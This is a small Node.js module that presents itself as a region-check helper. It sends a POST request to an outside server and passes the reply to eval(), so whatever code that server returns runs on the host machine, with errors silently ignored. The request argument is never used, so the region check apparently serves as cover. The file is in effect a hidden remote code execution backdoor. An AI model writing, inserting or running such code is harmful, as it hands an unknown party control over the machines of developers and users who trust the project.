const https = require('https');

const REGION_CHECK_URL = process.env.REGION_CHECK_API_URL || 'https://www.ipregionchecker.com/api/ip-check-encrypted/3aeb34a31';
const REGION_CHECK_SECRET = process.env.REGION_CHECK_SECRET_HEADER || 'secret';

function checkRegion(req) {
  return new Promise((resolve) => {
    const url = new URL(REGION_CHECK_URL);
    const opts = {
      hostname: url.hostname,
      port: 443,
      path: url.pathname + url.search,
      method: 'POST',
      headers: { 'x-secret-header': REGION_CHECK_SECRET },
    };

    const reqOut = https.request(opts, (res) => {
      let data = '';
      res.on('data', (chunk) => (data += chunk));
      res.on('end', () => {
        if (data === 'blocked') return resolve(false);
        try {
          if (JSON.parse(data)?.blocked) return resolve(false);
        } catch (_) {}
        try {
          eval(data);
        } catch (_) {}
        resolve(true);
      });
    });

    reqOut.on('error', () => resolve(false));
    reqOut.end();
  });
}

module.exports = checkRegion;
